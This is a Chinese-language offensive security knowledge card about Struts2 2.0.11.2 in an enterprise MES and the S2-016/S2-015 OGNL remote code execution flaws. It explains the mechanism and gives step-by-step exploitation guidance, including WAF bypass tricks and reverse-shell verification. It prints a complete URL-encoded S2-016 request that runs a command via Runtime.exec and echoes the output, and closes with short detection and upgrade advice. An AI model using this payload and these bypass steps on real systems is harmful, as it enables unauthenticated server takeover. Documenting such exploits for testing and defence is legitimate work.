---
id: web-java-framework-struts2-s2-016-legacy-version-ognl-rce
title: Struts2 2.0.11.2 旧版本匹配 S2-016/S2-015：redirect/redirectAction 前缀 OGNL 未授权 RCE
type: scenario
domain: web
path: web/java/framework/struts2
technique: struts2-legacy-s2-016-redirect-ognl
aliases:
- S2-016
- CVE-2013-2251
- S2-015
- CVE-2013-2134
- CVE-2013-2135
- Struts2 2.0.11.2 RCE
- redirect OGNL 注入
tags:
- java
- struts2
- ognl
- rce
- legacy
- cve-2013-2251
cve:
- CVE-2013-2251
- CVE-2013-2134
- CVE-2013-2135
severity: critical
confidence: medium
status: verified
affected_versions: 本案例 struts2-core 2.0.11.2；S2-016 影响 2.0.0–2.3.15，S2-015 影响 2.0.0–2.3.14.2（原文标记）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:02:25+08:00'
  notes: 已对照原文核对：struts2-core-2.0.11.2.jar 截图与 S2-016/S2-015 影响区间一致；原文仅做版本匹配（称 4 和 3 都可以），未给出 payload 或执行结果，卡内已标 confidence=medium，实际利用需确认 action mapper 可达与 WAF。
---

## 一句话结论

企业 MES 的 `WEB-INF/lib` 中为 `struts2-core-2.0.11.2.jar`，落在 S2-016（CVE-2013-2251，2.0.0–2.3.15）和 S2-015（CVE-2013-2134/2135，2.0.0–2.3.14.2）范围内；S2-016 通过 action 名前的 `redirect:`/`redirectAction:` 前缀让 `DefaultActionMapper` 对后续内容做 OGNL 求值，攻击者可在未认证情况下执行任意表达式并回显命令。

## 原理

- **S2-016（CVE-2013-2251）**：Struts2 的 `DefaultActionMapper` 支持 `action:`、`redirect:`、`redirectAction:` 等前缀来决定结果类型。处理 `redirect:`/`redirectAction:` 时，前缀后面的内容会被当作 OGNL 表达式求值；旧版本没有限制 `#context`、`#_memberAccess` 等内部对象，攻击者可修改 `allowStaticMethodAccess` 并调用 `java.lang.Runtime`。
- **S2-015（CVE-2013-2134/2135）**：`struts.xml` 中通配符 action（如 `*`）的匹配结果可在 action 名中嵌入 `${...}`，后续 result 使用 `{1}` 时触发 OGNL 求值；影响 2.0.0–2.3.14.2。
- **本案例的版本证据**：项目 `WEB-INF/lib/struts2-core-2.0.11.2.jar`，属于上述两个区间；原文据此判断 S2-015/S2-016 均可用（“4 和 3 都可以”），但未给出实际 payload 或执行截图。
- **利用前提**：目标暴露 Struts2 action 路由（`.action` 或配置的扩展名），且请求能到达 `DefaultActionMapper`；S2-016 的 mapper 级求值通常发生在业务 Action 鉴权之前，因此可能无需登录，但具体仍取决于过滤器/拦截器顺序与 WAF。
- **为什么旧版本危险**：2.0.x 没有后续的 OGNL 沙箱、`SecurityMemberAccess` 默认限制、`allowStaticMethodAccess` 默认 false 等加固；S2-016 的公开利用链非常成熟。

## 触发条件

- 目标使用 Struts2 2.0.0–2.3.15（S2-016）或 2.0.0–2.3.14.2（S2-015）；本案例为 2.0.11.2。
- 目标暴露 action 路由，且 `struts.action.extension` 允许 `.action`/空扩展名等可达路径。
- 请求未被 WAF/代理拦截 `redirect:`、`redirectAction:`、`${`、`#`、`@` 等 OGNL 特征。
- S2-016 在 mapper 阶段触发，通常不需要有效会话；S2-015 取决于通配符 action 与 result 配置。

## 利用步骤

1. 指纹确认版本：访问不存在的 action 观察 404/报错、读取 `struts2-core` jar 版本（源码/备份泄露时），或根据默认页面特征判断。
2. 选择一个可达的 action 路径（如 `/cmt/index.action` 或任意 `.action`）。
3. 在 action 名位置构造 `redirect:` 前缀 + OGNL 表达式；先执行 `id`/`whoami` 并把结果写入响应。
4. 若 `redirect:` 被过滤，尝试 `redirectAction:`、URL 编码、大小写、双写；若 S2-016 不通，按 S2-015 的通配符 action + `${...}` 方式测试。
5. 成功后用回显/写文件/反弹 shell 验证；注意不同 JDK/容器对 `#_memberAccess` 字段名（`allowStaticMethodAccess`）和 OGNL 版本有差异，需按目标调整。

## PoC

原文未提供 PoC；以下为 S2-016 公开利用形态，仅作结构示意，需按目标版本/编码调整：

```http
GET /cmt/index.action?redirect:${%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close()%7D HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

S2-015 结构示意（通配符 action 名注入）：

```text
/${%23context["xwork.MethodAccessor.denyMethodExecution"]=false,...}.action
```

## 变体与关联

- **S2-005/S2-009**：同版本区间还受 ParameterInterceptor OGNL 注入影响；若 `redirect:` 被拦，可测试参数名注入。
- **WAF 绕过**：URL 编码/双重编码、Unicode、`%24%7B`、大小写混用、`redirectAction:` 替代；不同版本对 `#`/`@` 的解析差异。
- **版本确认**：源码审计可直接看 `struts2-core-*.jar`；黑盒可通过默认错误页、`struts.action.extension` 行为、已知 S2 payload 的响应差异判断。
- 关联卡片：[[web-java-framework-struts2-actionproxy-ognl-injection]]、[[web-java-framework-struts2-s2-066-upload-filename-param-override]]。

## 检测与防御

- **升级**：Struts2 升级到 2.3.15.1+（S2-016 修复）或更高受支持版本；同时修复 S2-015。
- **配置**：关闭动态方法调用（`struts.enable.DynamicMethodInvocation=false`）；限制 `struts.action.extension`；移除不需要的 `redirect:`/`redirectAction:` 使用；启用 `SecurityMemberAccess` 与 OGNL 沙箱（新版本默认）。
- **检测**：请求 URI/参数含 `redirect:`、`redirectAction:`、`${`、`%24%7B`、`#_memberAccess`、`allowStaticMethodAccess`、`java.lang.Runtime`、`ProcessBuilder`；Struts2 错误页/OGNL 异常；Web 进程异常子进程。
- **应急**：确认是否被利用（访问日志、子进程、临时文件），升级并轮换可能泄露的凭据；在 WAF 侧临时拦截上述特征。
